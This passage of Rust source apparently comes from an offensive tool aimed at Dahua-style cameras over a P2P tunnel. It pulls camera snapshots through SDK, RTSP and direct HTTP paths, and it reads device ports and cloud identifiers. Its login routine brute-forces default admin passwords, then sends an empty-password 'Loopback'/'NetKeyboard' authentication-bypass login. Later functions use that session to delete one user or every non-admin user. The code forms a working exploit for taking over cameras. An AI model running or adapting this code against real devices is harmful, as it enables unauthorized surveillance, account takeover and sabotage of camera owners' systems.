                let client = sdk::SdkClient::new("", "").with_verbose(args.verbose);
                let jpeg = client.snapshot_on(sock, pcp_session, sess, *ch as usize).await;
                if let Some(jpeg_data) = jpeg {
                    if args.verbose {
                        eprintln!("  [debug] ch{} OK: {} SDK snapshot", ch, label);
                    }
                    body = Some(jpeg_data);
                } else if args.verbose {
                    eprintln!("  [debug] ch{} {} SDK snapshot failed", ch, label);
                }
            }
            if body.is_none() && args.verbose {
                eprintln!("  [debug] ch{} all SDK snapshot attempts failed", ch);
            }
        }

        // === RTSP over the PTCP tunnel (port forward) ===
        // p2pwn's `ForwardToLocal` (forward.go): bind a fresh realm to the
        // device RTSP port, relay a local TCP connection over it and run the
        // existing RTSP/MJPEG client against 127.0.0.1 — so RTSP works even on
        // devices whose media port is not exposed to the public IP (NAT). Works
        // without a DHIP session too, like the SDK branch above.
        if body.is_none() {
            let rtsp_creds: Vec<(&str, String, String)> = [
                (
                    "rtsp-tunnel-admin",
                    args.admin_user.clone(),
                    args.admin_pass.clone(),
                ),
                (
                    "rtsp-tunnel-camera",
                    args.user.clone(),
                    args.password.clone(),
                ),
            ]
            .into_iter()
            .collect();
            if let Some(jp) = grab_rtsp_tunnel(
                sock,
                pcp_session,
                &rtsp_creds,
                rtsp_port,
                *ch,
                probe_timeout,
                args.verbose,
            )
            .await
            {
                body = Some(jp);
            }
        }

        // === Direct TCP HTTP (no PTCP tunnel) ===
        if body.is_none() && args.direct_http && !device_ip.is_empty() {
            let mut ports_to_try = vec![http_port];
            for &p in &[80u16, 8080, 8000, 88] {
                if p != http_port && !ports_to_try.contains(&p) {
                    ports_to_try.push(p);
                }
            }
            'direct_loop: for &direct_port in &ports_to_try {
                for (label, ref_quser, ref_qpass) in &[
                    (
                        "direct-admin",
                        args.admin_user.clone(),
                        args.admin_pass.clone(),
                    ),
                    ("direct-camera", args.user.clone(), args.password.clone()),
                ] {
                    for variant in &path_variants {
                        let path = if ref_quser.is_empty() {
                            variant.clone()
                        } else {
                            format!("{}&user={}&password={}", variant, ref_quser, ref_qpass)
                        };
                        if args.verbose {
                            eprintln!(
                                "  [debug] ch{} trying direct HTTP {}:{} {}",
                                ch, device_ip, direct_port, label
                            );
                        }
                        let r = http_get_direct(
                            &device_ip,
                            direct_port,
                            &path,
                            ref_quser,
                            ref_qpass,
                            probe_timeout,
                        )
                        .await;
                        if let Some((ref_h, ref_b)) = r {
                            let is_jpeg = ref_b.len() >= 3
                                && ref_b[0] == 0xFF
                                && ref_b[1] == 0xD8
                                && ref_b[2] == 0xFF;
                            if is_jpeg {
                                body = Some(ref_b.clone());
                                if args.verbose {
                                    eprintln!(
                                        "  [debug] ch{} OK: {} direct to {}:{} path={}",
                                        ch, label, device_ip, direct_port, variant
                                    );
                                }
                                break 'direct_loop;
                            } else if args.verbose {
                                let preview: String =
                                    ref_b.iter().take(80).map(|&b| b as char).collect();
                                let status = ref_h.lines().next().unwrap_or("");
                                eprintln!(
                                    "  [debug] ch{} {} direct to {}:{} → {} ({} bytes): {}",
                                    ch,
                                    label,
                                    device_ip,
                                    direct_port,
                                    status,
                                    ref_b.len(),
                                    preview
                                );
                            }
                        }
                    }
                }
            }
            if body.is_none() && args.verbose {
                eprintln!(
                    "  [debug] ch{} all direct HTTP attempts to {} failed",
                    ch, device_ip
                );
            }
        }

        // === RTSP fallback (TCP to device IP, ports 554/854) ===
        if body.is_none() && args.rtsp && !device_ip.is_empty() {
            for (label, ref_quser, ref_qpass) in &[
                (
                    "rtsp-admin",
                    args.admin_user.clone(),
                    args.admin_pass.clone(),
                ),
                ("rtsp-camera", args.user.clone(), args.password.clone()),
            ] {
                if !ref_quser.is_empty() || !ref_qpass.is_empty() {
                    let jpeg = dahua_dhip_adduser::rtsp::capture_snapshot(
                        &device_ip,
                        rtsp_port,
                        *ch as u16,
                        ref_quser,
                        ref_qpass,
                        probe_timeout,
                    )
                    .await;
                    if let Some(jpeg_data) = jpeg {
                        if args.verbose {
                            eprintln!(
                                "  [debug] ch{} OK: {} RTSP to {} ch={}",
                                ch, label, device_ip, ch
                            );
                        }
                        body = Some(jpeg_data);
                        break;
                    } else if args.verbose {
                        eprintln!(
                            "  [debug] ch{} {} RTSP to {} ch={} failed",
                            ch, label, device_ip, ch
                        );
                    }
                }
            }
            if body.is_none() && args.verbose {
                eprintln!(
                    "  [debug] ch{} all RTSP attempts to {} failed",
                    ch, device_ip
                );
            }
        }

        match body {
            Some(bytes) => {
                // SOI *and* EOI must be present: a truncated image is not a
                // snapshot, and accepting one silently hides the real failure.
                if is_valid_jpeg(&bytes) {
                    consecutive_failures = 0;
                    let fname = format!("{0}/{1}_ch{2}.jpg", out_dir, serial, ch);
                    std::fs::write(&fname, &bytes)
                        .map_err(|e| format!("cannot write {}: {}", fname, e))?;
                    println!("  [+] ch{} → {} ({} bytes)", ch, fname, bytes.len());
                    captured += 1;
                } else {
                    consecutive_failures += 1;
                    println!(
                        "  [-] ch{} → incomplete JPEG ({} bytes, EOI {}), discarded",
                        ch,
                        bytes.len(),
                        if bytes.ends_with(&[0xFF, 0xD9]) {
                            "present"
                        } else {
                            "missing"
                        }
                    );
                }
            }
            None => {
                consecutive_failures += 1;
                match &last_status {
                    // A 401/403 is a real answer: the CGI exists but our auth was
                    // rejected. Saying "no response" sent us hunting for a dead
                    // channel instead of a missing password.
                    Some(st) if st.contains("401") || st.contains("403") => {
                        println!(
                            "  [-] ch{} → {} from snapshot CGI: auth rejected, retry with -u/-w or --admin-pass (or --try-defaults)",
                            ch, st
                        );
                    }
                    Some(st) => {
                        println!(
                            "  [-] ch{} → {} from snapshot CGI: reachable but no JPEG in the response body",
                            ch, st
                        );
                    }
                    None => {
                        println!(
                            "  [-] ch{} → no response via snapshot CGI (channel may not expose it / needs RTSP)",
                            ch
                        );
                    }
                }
            }
        }
    }

    if probing && consecutive_failures == channels.len() {
        println!(
            "  [!] all {} probed channel(s) failed (device may have no cameras or the snapshot CGI is unavailable)",
            consecutive_failures
        );
    }

    if !dhip_freed {
        if let Some(c) = chal.as_ref() {
            ptcp_disconnect(sock, pcp_session, c.realm_id).await;
        }
    }

    // Release the per-device SDK login (kept open across every channel above).
    if let Some((sess, _)) = sdk_slot.as_ref() {
        let client = sdk::SdkClient::new("", "");
        client.close_session(sock, pcp_session, sess).await;
    }

    if captured == 0 {
        Err(format!("no snapshot captured for {}", serial))
    } else {
        Ok(())
    }
}

/// Ask the device which camera channels exist/are active, using getConfig on the
/// tables that describe channels. Fall back to a progressive probe if nothing
/// structured comes back.
async fn discover_channels(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    ctx: &DhipCtx,
    verbose: bool,
    probe_timeout: Duration,
) -> Vec<u32> {
    let tables = ["ChannelTitle", "VideoInChannels", "Camera"];
    let mut seen: Vec<u32> = Vec::new();
    for t in tables {
        let req = json!({"id": 445, "magic": "0x1234", "method": "configManager.getConfig",
            "params": {"name": t}, "session": ctx.session_id});
        if let Some(resp) = dhip_call(
            sock,
            pcp_session,
            &ctx.dhip,
            &req.to_string(),
            probe_timeout,
        )
        .await
        {
            if let Ok(v) = serde_json::from_str::<Value>(&resp) {
                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                    if let Some(params) = v.get("params") {
                        let ids = collect_channel_ids(params);
                        for id in ids {
                            if id > 0 && !seen.contains(&id) {
                                seen.push(id);
                            }
                        }
                        if !seen.is_empty() {
                            if verbose {
                                eprintln!("[debug] discover_channels({}): {:?}", t, seen);
                            }
                            seen.sort_unstable();
                            return seen;
                        }
                    }
                }
            }
        }
    }
    seen
}

/// Recursively collect numeric channel ids from a getConfig params object.
/// Looks for `Id`/`ChannelId`/`Channel`/`ChannelNo` fields that look like a
/// 1-based camera index, and counts array entries whose objects carry such an id.
fn collect_channel_ids(params: &serde_json::Value) -> Vec<u32> {
    fn is_id_key(k: &str) -> bool {
        let l = k.to_lowercase();
        l == "channelid"
            || l == "channelidno"
            || l == "channelno"
            || (l == "channel" && k.chars().all(|c| c.is_alphanumeric() || c == '#'))
            || (l == "id" || l == "cameraid" || l == "videoinputchannelid")
    }
    let mut out: Vec<u32> = Vec::new();
    fn walk(v: &serde_json::Value, is_id_key: &dyn Fn(&str) -> bool, out: &mut Vec<u32>) {
        match v {
            serde_json::Value::Object(map) => {
                for (k, val) in map {
                    if is_id_key(k) {
                        if let Some(n) = val.as_u64() {
                            out.push(n as u32);
                        } else if let Some(n) = val.as_i64() {
                            if n > 0 {
                                out.push(n as u32);
                            }
                        } else if let Some(s) = val.as_str() {
                            if let Ok(n) = s.trim().parse::<u64>() {
                                out.push(n as u32);
                            }
                        }
                    }
                    walk(val, is_id_key, out);
                }
            }
            serde_json::Value::Array(arr) => {
                for item in arr {
                    walk(item, is_id_key, out);
                }
            }
            _ => {}
        }
    }
    walk(params, &is_id_key, &mut out);
    out.sort_unstable();
    out.dedup();
    out
}

/// Query the device for its HTTP/RTSP ports over a live, logged-in DHIP session:
/// `InetWeb` first, then the `Network` table for older firmware that has no
/// InetWeb section. Shared by the snapshot flow and the HTTP add-user fallback.
async fn query_network_ports(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    session_id: u32,
    probe_timeout: Duration,
    verbose: bool,
) -> NetworkPorts {
    let mut ports = NetworkPorts {
        http: None,
        rtsp: None,
    };

    let req = json!({"id": 450, "magic": "0x1234", "method": "configManager.getConfig",
        "params": {"name": "InetWeb"}, "session": session_id});
    match dhip_call(sock, pcp_session, dhip, &req.to_string(), probe_timeout).await {
        Some(resp) => match serde_json::from_str::<Value>(&resp) {
            Ok(v) => {
                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                    match v.get("params") {
                        Some(params) => {
                            ports = extract_network_ports(params);
                            if verbose {
                                eprintln!(
                                    "[debug] device InetWeb: HTTP port={:?}, RTSP port={:?}",
                                    ports.http, ports.rtsp
                                );
                            }
                        }
                        None if verbose => {
                            eprintln!("[debug] device InetWeb: result=true but no params");
                        }
                        _ => {}
                    }
                } else if verbose {
                    let err = v.get("error").map(|e| e.to_string()).unwrap_or_default();
                    eprintln!("[debug] device InetWeb: result=false {}", err);
                }
            }
            Err(_) if verbose => {
                let preview: String = resp.chars().take(200).collect();
                eprintln!("[debug] device InetWeb: parse error: {}", preview);
            }
            Err(_) => {}
        },
        None if verbose => {
            eprintln!("[debug] device InetWeb: no response (timeout)");
        }
        None => {}
    }

    // Also try "Network" table for older firmware that doesn't have InetWeb
    // (or reported the plain 80 default, matching the historical behaviour).
    if ports.http.is_none() || ports.http == Some(80) {
        let req2 = json!({"id": 451, "magic": "0x1234", "method": "configManager.getConfig",
            "params": {"name": "Network"}, "session": session_id});
        if let Some(resp) =
            dhip_call(sock, pcp_session, dhip, &req2.to_string(), probe_timeout).await
        {
            if let Ok(v) = serde_json::from_str::<Value>(&resp) {
                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                    if let Some(params) = v.get("params") {
                        let net = extract_network_ports(params);
                        if let Some(p) = net.http {
                            ports.http = Some(p);
                            if verbose {
                                eprintln!("[debug] device Network: HTTP port={}", p);
                            }
                        }
                        if ports.rtsp.is_none() {
                            ports.rtsp = net.rtsp;
                        }
                    }
                }
            }
        }
    }

    ports
}

struct NetworkPorts {
    http: Option<u16>,
    rtsp: Option<u16>,
}

/// Extract HTTP/RTSP ports from an InetWeb config object.
/// InetWeb can be a single object `{HttpPort: 80, RtspPort: 554, ...}` or
/// an array of such objects.
fn extract_network_ports(params: &serde_json::Value) -> NetworkPorts {
    let mut result = NetworkPorts {
        http: None,
        rtsp: None,
    };
    fn walk(v: &serde_json::Value, out: &mut NetworkPorts) {
        match v {
            serde_json::Value::Object(map) => {
                for (k, val) in map {
                    let lk = k.to_lowercase();
                    if (lk == "httpport" || lk == "port" || lk == "webport" || lk == "http_port")
                        && out.http.is_none()
                    {
                        if let Some(n) = val.as_u64() {
                            out.http = Some(n as u16);
                        } else if let Some(s) = val.as_str() {
                            if let Ok(n) = s.trim().parse::<u16>() {
                                out.http = Some(n);
                            }
                        }
                    }
                    if (lk == "rtspport" || lk == "rtsp_port" || lk == "mediaport")
                        && out.rtsp.is_none()
                    {
                        if let Some(n) = val.as_u64() {
                            out.rtsp = Some(n as u16);
                        } else if let Some(s) = val.as_str() {
                            if let Ok(n) = s.trim().parse::<u16>() {
                                out.rtsp = Some(n);
                            }
                        }
                    }
                    walk(val, out);
                }
            }
            serde_json::Value::Array(arr) => {
                for item in arr {
                    walk(item, out);
                }
            }
            _ => {}
        }
    }
    walk(params, &mut result);
    result
}

/// Extract flat `key=value` pairs from a getConfig params object that look P2P/
/// cloud related (account, user, status, regist, online, uid, enabled, msg).
fn relevant_p2p_fields(params: &serde_json::Value) -> String {
    const KEYS: &[&str] = &[
        "Account",
        "account",
        "User",
        "user",
        "UserName",
        "Password",
        "Status",
        "status",
        "Regist",
        "regist",
        "RegistStatus",
        "Online",
        "online",
        "State",
        "state",
        "Enable",
        "enable",
        "UID",
        "uid",
        "Serial",
        "Msg",
        "msg",
        "Info",
        "Address",
        "Server",
    ];
    let mut out: Vec<String> = Vec::new();
    collect_p2p(params, KEYS, &mut out, "");
    out.join("  ")
}

/// True for config table names that clearly relate to P2P/cloud (their full raw
/// content should be dumped even if no individual P2P key was recognised).
fn is_strongly_p2p_table(name: &str) -> bool {
    matches!(
        name,
        "P2P" | "p2p" | "Network" | "network" | "_Cloud" | "Cloud" | "cloud" | "DDNS" | "ddns"
    )
}

/// Try to find the P2P UID/identifier of the device inside a getConfig params
/// object. Looks for dedicated fields (UID, SN, SeedsId, DeviceID, ...) and for
/// known string forms (e.g. `SEED-xxxx...`). Returns the first convincing match.
fn extract_p2p_uid(params: &serde_json::Value) -> Option<String> {
    const UID_KEYS: &[&str] = &[
        "UID", "uid", "Uid", "SN", "sn", "SeedsId", "SeedsID", "DeviceID", "DeviceSN", "DeviceID",
        "ID", "P2pId", "P2PId", "CloudUid", "CloudUID",
    ];
    find_uid_value(params, UID_KEYS)
}

fn find_uid_value(v: &serde_json::Value, keys: &[&str]) -> Option<String> {
    match v {
        serde_json::Value::Object(map) => {
            for (k, val) in map {
                let key_lower = k.to_lowercase();
                let is_uid_key = keys.iter().any(|kk| kk.eq_ignore_ascii_case(k))
                    || key_lower.contains("seed")
                    || key_lower.contains("uid")
                    || key_lower == "sn";
                if is_uid_key {
                    if let Some(s) = uid_from_value(val) {
                        // evita valori banali/vuoti/placeholder
                        let t = s.trim();
                        if !t.is_empty()
                            && !t.eq_ignore_ascii_case("null")
                            && t != "-"
                            && !t.eq_ignore_ascii_case("0")
                        {
                            return Some(t.to_string());
                        }
                    }
                }
                if let Some(found) = find_uid_value(val, keys) {
                    return Some(found);
                }
            }
        }
        serde_json::Value::Array(arr) => {
            for item in arr {
                if let Some(found) = find_uid_value(item, keys) {
                    return Some(found);
                }
            }
        }
        _ => {}
    }
    None
}

fn uid_from_value(v: &serde_json::Value) -> Option<String> {
    match v {
        serde_json::Value::String(s) => {
            // riconosce anche UID racchiuso in testi tipo "SEED-xxxx" o "UID:xxx"
            let t = s.trim();
            if t.len() >= 5 {
                return Some(t.to_string());
            }
            None
        }
        serde_json::Value::Number(n) => Some(n.to_string()),
        serde_json::Value::Null | serde_json::Value::Bool(_) => None,
        serde_json::Value::Object(_) | serde_json::Value::Array(_) => None,
    }
}

fn collect_p2p(v: &serde_json::Value, keys: &[&str], out: &mut Vec<String>, prefix: &str) {
    match v {
        serde_json::Value::Object(map) => {
            for (k, val) in map {
                let key_lower = k.to_lowercase();
                let is_relevant = keys.iter().any(|kk| kk.eq_ignore_ascii_case(k))
                    || key_lower.contains("p2p")
                    || key_lower.contains("cloud")
                    || key_lower.contains("ddns");
                if is_relevant {
                    let value_str = match val {
                        serde_json::Value::Object(_) | serde_json::Value::Array(_) => {
                            // compatta come JSON monolinea
                            val.to_string()
                        }
                        _ => val.to_string(),
                    };
                    out.push(format!("{}{}={}", prefix, k, value_str));
                }
                collect_p2p(val, keys, out, &format!("{}{}.", prefix, k));
            }
        }
        serde_json::Value::Array(arr) => {
            for (i, item) in arr.iter().enumerate() {
                collect_p2p(item, keys, out, &format!("{}[{}].", prefix, i));
            }
        }
        _ => {}
    }
}

/// Establish an authenticated HTTP/RPC2 session over the PTCP tunnel on a given
/// port. Performs the PTCP bind, the login challenge, and the real/bypass login;
/// returns the bound `realm_id` and the session string. The channel is left open.
async fn http_establish_session(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    port: u16,
    args: &Args,
) -> Result<(u32, String), String> {
    let bind_timeout = args.timeout_or(15);
    let realm_id = ptcp_bind_retry(sock, pcp_session, port, bind_timeout, args.verbose)
        .await
        .ok_or_else(|| format!("PTCP bind failed on port {}", port))?;

    let host = format!("127.0.0.1:{}", port);
    let timeout = args.timeout_or(15);

    let login1 = json!({
        "method": "global.login",
        "params": {
            "userName": &args.admin_user,
            "password": "",
            "clientType": "Web3.0",
            "loginType": "Direct",
        },
        "id": 10000,
    });

    let resp1 = http_call(
        sock,
        pcp_session,
        realm_id,
        &host,
        "/RPC2_Login",
        &login1.to_string(),
        timeout,
        "",
    )
    .await
    .ok_or("HTTP login challenge timeout")?;
    let resp1_body = http_extract_body(&resp1).ok_or("No body in HTTP challenge response")?;
    let val1: Value = serde_json::from_str(resp1_body)
        .map_err(|e| format!("bad JSON in HTTP challenge: {}", e))?;

    let session = val1
        .get("session")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();

    // Already logged in (some firmware returns result:true immediately)
    if val1
        .get("result")
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
    {
        return Ok((realm_id, session));
    }

    if session.is_empty() {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("no session in HTTP challenge".into());
    }

    let http_realm = val1
        .get("params")
        .and_then(|p| p.get("realm"))
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let http_random = val1
        .get("params")
        .and_then(|p| p.get("random"))
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let hash = empty_password_hash(&args.admin_user, http_realm, http_random);

    let mut login_ok = false;
    let bypasses = [("Loopback", "Local"), ("Direct", "NetKeyboard")];
    if !args.admin_pass.is_empty() {
        let pw_hash = password_hash(&args.admin_user, http_realm, http_random, &args.admin_pass);
        let login2 = json!({
            "method": "global.login", "session": &session, "params": {
                "userName": &args.admin_user, "password": pw_hash, "ipAddr": "127.0.0.1",
                "loginType": "Loopback", "clientType": "Local",
                "authorityType": "Default", "passwordType": "Default",
            }, "id": 10001,
        });
        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            &host,
            "/RPC2_Login",
            &login2.to_string(),
            timeout,
            &session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        login_ok = true;
                    }
                }
            }
        }
    }

    if !login_ok && args.try_defaults {
        for pw in DEFAULT_ADMIN_PASSWORDS {
            let pw_hash = password_hash(&args.admin_user, http_realm, http_random, pw);
            let login2 = json!({
                "method": "global.login", "session": &session, "params": {
                    "userName": &args.admin_user, "password": pw_hash, "ipAddr": "127.0.0.1",
                    "loginType": "Loopback", "clientType": "Local",
                    "authorityType": "Default", "passwordType": "Default",
                }, "id": 10001,
            });
            if let Some(t) = http_call(
                sock,
                pcp_session,
                realm_id,
                &host,
                "/RPC2_Login",
                &login2.to_string(),
                timeout,
                &session,
            )
            .await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            login_ok = true;
                            if args.verbose {
                                eprintln!("[debug] HTTP login OK with default password '{}'", pw);
                            }
                            break;
                        }
                        if args.verbose {
                            eprintln!("[debug] HTTP default password '{}' rejected: {}", pw, b);
                        }
                    }
                }
            }
        }
    }

    if !login_ok {
        for (login_type, client_type) in &bypasses {
            let login2 = json!({
                "method": "global.login", "session": &session, "params": {
                    "userName": &args.admin_user, "password": hash, "ipAddr": "127.0.0.1",
                    "loginType": login_type, "clientType": client_type,
                    "authorityType": "Default", "passwordType": "Default",
                }, "id": 10001,
            });
            if let Some(t) = http_call(
                sock,
                pcp_session,
                realm_id,
                &host,
                "/RPC2_Login",
                &login2.to_string(),
                timeout,
                &session,
            )
            .await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            login_ok = true;
                            break;
                        }
                    }
                }
            }
        }
    }

    if !login_ok {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("HTTP bypass login failed".into());
    }

    Ok((realm_id, session))
}

/// Delete a user via HTTP/RPC2 on a specific port (bypass login first).
async fn http_try_delete_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    _dh_realm: &str,
    port: u16,
    user_id: Option<u32>,
    user_name: Option<String>,
    args: &Args,
) -> Result<(), String> {
    if args.verbose {
        eprintln!(
            "[debug] HTTP deleteUser (Id={:?}, Name={:?}) using port {}",
            user_id, user_name, port
        );
    }
    let (realm_id, session) = http_establish_session(sock, pcp_session, port, args).await?;
    let host = format!("127.0.0.1:{}", port);
    let timeout = args.timeout_or(15);
    let result = http_delete_user(
        sock,
        pcp_session,
        realm_id,
        &host,
        &session,
        user_id,
        user_name,
        args,
    )
    .await;
    let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// Send userManager.deleteUser (resolves the full user object from Id or Name first).
async fn http_delete_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    user_id: Option<u32>,
    user_name: Option<String>,
    args: &Args,
) -> Result<(), String> {
    let timeout = args.timeout_or(15);

    // Resolve user object via getUserInfoAll (by Id or by Name).
    // La tupla (Option<Value>, bool): il bool = lista utenti letta con successo (usato
    // per il fail-fast sotto, così `6B003ACPAZ64EDE` non spreca ~13 varianti deleteUser
    // con {"name":null} → tutte rifiutate con 268894211 "Request invalid param!").
    let (user_obj, listed) = if let Some(n) = &user_name {
        let (o, l) = http_find_user_object_by_name(
            sock,
            pcp_session,
            realm_id,
            host,
            session,
            n,
            timeout,
            args.verbose,
        )
        .await;
        (o, l)
    } else {
        let (o, l) = http_find_user_object(
            sock,
            pcp_session,
            realm_id,
            host,
            session,
            user_id.unwrap_or(0),
            timeout,
            args.verbose,
        )
        .await;
        (o, l)
    };
    let user_id = user_obj
        .as_ref()
        .and_then(|u| u.get("Id"))
        .and_then(|x| x.as_u64())
        .map(|v| v as u32)
        .unwrap_or(user_id.unwrap_or(0));
    let name = user_obj
        .as_ref()
        .and_then(|u| u.get("Name"))
        .and_then(|n| n.as_str())
        .map(String::from)
        .or(user_name);
    match &name {
        Some(n) => {
            if args.verbose {
                eprintln!("[debug] delete target -> Name '{}' (Id {})", n, user_id);
            }
        }
        None => {
            if args.verbose {
                eprintln!("[debug] user Id={} not found in user list", user_id);
            }
        }
    }
    if listed && name.is_none() {
        return Err(format!(
            "user Id={} not found on device (user list queried ok) — aborting delete",
            user_id
        ));
    }

    // deleteUser param variants, most-specific first
    let mut variants: Vec<Value> = Vec::new();
    variants.extend([json!({"name": name}), json!({"name": name, "id": user_id})]);
    if let Some(u) = &user_obj {
        variants.push(json!({"user": u}));
    }
    variants.extend([
        json!({"user": {"Id": user_id, "Name": name}}),
        json!({"user": {"Name": name}}),
        json!({"user": {"Id": user_id}}),
        json!({"Id": user_id}),
        json!({"account": {"Id": user_id, "Name": name}}),
        json!({"account": {"Name": name}}),
        json!({"account": {"Id": user_id}}),
        json!({"user": {"Id": user_id, "Name": name}, "id": user_id}),
        json!({"users": [{"Id": user_id, "Name": name}]}),
        json!({"user": {"Id": user_id, "Name": name}, "session": session}),
        json!([{"Id": user_id, "Name": name}]),
        json!([{"user": {"Id": user_id, "Name": name}}]),
    ]);
    if user_obj.is_none() {
        variants.extend([
            json!({"users": [{"Id": user_id}]}),
            json!({"users": [{"Id": user_id, "Name": name}]}),
        ]);
    }

    for params in variants {
        let body = json!({
            "method": "userManager.deleteUser",
            "session": session,
            "params": params,
            "id": 101,
        });
        if args.verbose {
            eprintln!("[debug] deleteUser: {}", body);
        }
        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            host,
            "/RPC2",
            &body.to_string(),
            timeout,
            session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        println!(
                            "  [+] user Id={} ({}) deleted via HTTP/RPC2",
                            user_id,
                            name.as_deref().unwrap_or("?")
                        );
                        return Ok(());
                    }
                    if args.verbose {
                        eprintln!("[debug] deleteUser variant failed: {}", b);
                    }
                }
            }
        } else if last_call_disc() {
            if args.verbose {
                eprintln!("[debug] deleteUser: device sent DISC — aborting");
            }
            return Err("device disconnected".into());
        }
    }

    // Fallback: alternate delete method names
    let alt_methods = ["accountManager.deleteAccount", "userManager.deleteUsers"];
    for method in alt_methods {
        for params in [
            json!({"name": name}),
            json!({"user": {"Id": user_id}}),
            json!({"account": {"Name": name}}),
        ] {
            let body = json!({"method": method, "session": session, "params": params, "id": 101});
            if args.verbose {
                eprintln!("[debug] {}: {}", method, body);
            }
            if let Some(t) = http_call(
                sock,
                pcp_session,
                realm_id,
                host,
                "/RPC2",
                &body.to_string(),
                timeout,
                session,
            )
            .await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            println!(
                                "  [+] user Id={} ({}) deleted via {}",
                                user_id,
                                name.as_deref().unwrap_or("?"),
                                method
                            );
                            return Ok(());
                        }
                        if args.verbose {
                            eprintln!("[debug] {} failed: {}", method, b);
                        }
                    }
                }
            } else if last_call_disc() {
                if args.verbose {
                    eprintln!("[debug] {}: device sent DISC — aborting", method);
                }
                return Err("device disconnected".into());
            }
        }
    }

    Err(format!("deleteUser failed for Id {}", user_id))
}

/// Delete ALL users except admin via HTTP/RPC2 on a specific port.
async fn http_try_delete_all(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    _dh_realm: &str,
    port: u16,
    args: &Args,
) -> Result<(), String> {
    if args.verbose {
        eprintln!("[debug] HTTP delete-all using port {}", port);
    }
    let (realm_id, session) = http_establish_session(sock, pcp_session, port, args).await?;
    let host = format!("127.0.0.1:{}", port);
    let timeout = args.timeout_or(15);
    let result = http_delete_all_users(sock, pcp_session, realm_id, &host, &session, args).await;
    let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// Send userManager.deleteUser for every non-admin user (Id==2 or name "admin" skipped).
async fn http_delete_all_users(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    args: &Args,
) -> Result<(), String> {
    let timeout = args.timeout_or(15);

    // List all users.
    let body = json!({
        "method": "userManager.getUserInfoAll",
        "session": session,
        "params": {},
        "id": 102,
    });
    let mut users: Vec<Value> = Vec::new();
    let mut listed = false;
    if let Some(t) = http_call(
        sock,
        pcp_session,
        realm_id,
        host,
        "/RPC2",
        &body.to_string(),
        timeout,
        session,
    )
    .await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if let Some(arr) = v
                    .get("params")
                    .and_then(|p| p.get("users"))
                    .and_then(|u| u.as_array())
                {
                    users = arr.clone();
                    listed = true;
                }
            }
        }
    }
    if !listed {
        return Err("getUserInfoAll: no/invalid response — device never listed users".into());
    }

    // Collect targets except admin.
    let admin_id = 2u32;
    let targets: Vec<(u32, String)> = users
        .iter()
        .filter_map(|u| {
            let id = u
                .get("Id")
                .and_then(|x| x.as_u64())
                .map(|v| v as u32)
                .unwrap_or(0);
            let nm = u
                .get("Name")
                .and_then(|x| x.as_str())
                .unwrap_or("")
                .to_string();
            let is_admin = id == admin_id || nm.eq_ignore_ascii_case("admin");
            if is_admin {
                None
            } else {
                Some((id, nm))
            }
        })
        .collect();

    if targets.is_empty() {
        println!("  [!] no non-admin users found on device — nothing to delete");
        return Ok(());
    }
    println!("  [*] deleting {} user(s) (keeping admin)", targets.len());

    let mut deleted = 0usize;
    let mut failed = 0usize;
    for (id, nm) in &targets {
        let mut variants: Vec<Value> = vec![json!({"name": nm})];
        variants.extend([
            json!({"name": nm, "id": id}),
            json!({"user": {"Id": id, "Name": nm}}),
            json!({"user": {"Id": id}}),
            json!({"user": {"Name": nm}}),
            json!({"Id": id}),
            json!({"account": {"Id": id, "Name": nm}}),
            json!({"account": {"Name": nm}}),
            json!({"account": {"Id": id}}),
            json!({"users": [{"Id": id, "Name": nm}]}),
            json!([{"Id": id, "Name": nm}]),
        ]);
        let mut ok_this = false;
        for params in variants {
            let b2 = json!({
                "method": "userManager.deleteUser",
                "session": session,
                "params": params,
                "id": 101,
            });
            if args.verbose {
                eprintln!("[debug] deleteUser: {}", b2);
            }
            if let Some(t) = http_call(
                sock,
                pcp_session,
                realm_id,
                host,
                "/RPC2",
                &b2.to_string(),
                timeout,
                session,
            )
            .await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            ok_this = true;
                            break;
                        }
                    }
                }
            } else if last_call_disc() {
